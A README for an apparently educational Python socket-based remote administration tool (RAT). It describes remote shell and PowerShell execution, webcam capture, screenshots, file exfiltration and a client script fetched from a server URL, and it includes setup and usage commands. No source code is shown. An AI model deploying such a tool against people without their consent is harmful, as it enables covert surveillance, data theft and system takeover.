This Project is only for Educational Purposes


Remote Administration Tool (RAT) Using Sockets

This repository contains a Python-based Remote Administration Tool (RAT) implemented using sockets. It allows a server to connect to a client for executing commands, capturing webcam images, taking screenshots, and downloading files remotely. The tool supports both command-line and PowerShell interactions on the client system.

Features

Server-Side Features

Command Execution: Execute shell or PowerShell commands on the client.

Webcam Capture: Capture and save webcam images from the client.

Screenshot Capture: Take screenshots of the client’s desktop.

File Download: Download files from the client system.

Dynamic Mode Switching: Choose between CMD or PowerShell execution modes.

Client-Side Features

Webcam Integration: Captures images using the client's webcam.

Screenshot Utility: Captures and sends the current screen.

File Transfer: Sends requested files to the server.

Command Handling: Executes received commands and sends back output.

Requirements

Server-Side

Python 3.x

socket module (built-in)

sys module (built-in)

Client-Side

Python 3.x

socket module (built-in)

subprocess module (built-in)

cv2 (OpenCV) for webcam access

Pillow for screenshots

requests module for fetching remote scripts

os module (built-in)

Setup

Server

Clone the Repository:

git clone https://github.com/prog-ammar/Website
cd Website

Run the Server Script:

python3 server.py

Configure Host and Port:

Modify the connect() function in server.py to set your desired host and port.

Accept Connections:
The server will wait for a client to connect and provide options for command-line or PowerShell interactions.

Client

Download the Script:

The client script is dynamically fetched from the server’s hosted URL using requests.

Alternatively, download it manually from the repository.

Run the Client Script:

python3 client.py

Connect to the Server:

Ensure the server's IP address and port are correctly configured in the connect() function.

Usage

Commands

Webcam Capture:

Run webcam <filename> on the server to capture an image from the client's webcam.

Example: webcam capture1

Screenshot Capture:

Run ss <filename> to take a screenshot.

Example: ss desktop_view

File Download:

Run download <filepath> to fetch a file from the client.

Example: download C:\\Users\\Public\\testfile.txt

Execute Commands:

Run any shell command directly in the server terminal.

Exit

Use exit to close the connection.

Security Disclaimer

This tool is intended for educational purposes only. Unauthorized use of this tool to access systems without explicit permission is illegal and unethical. Always use responsibly.

Future Enhancements

Implement encrypted communication (e.g., using TLS/SSL).

Add multi-client support for handling multiple connections simultaneously.

Improve error handling and input validation.

Integrate logging and monitoring for executed commands.

Contributing

Feel free to fork this repository, create new features, or report issues. Contributions are always welcome!
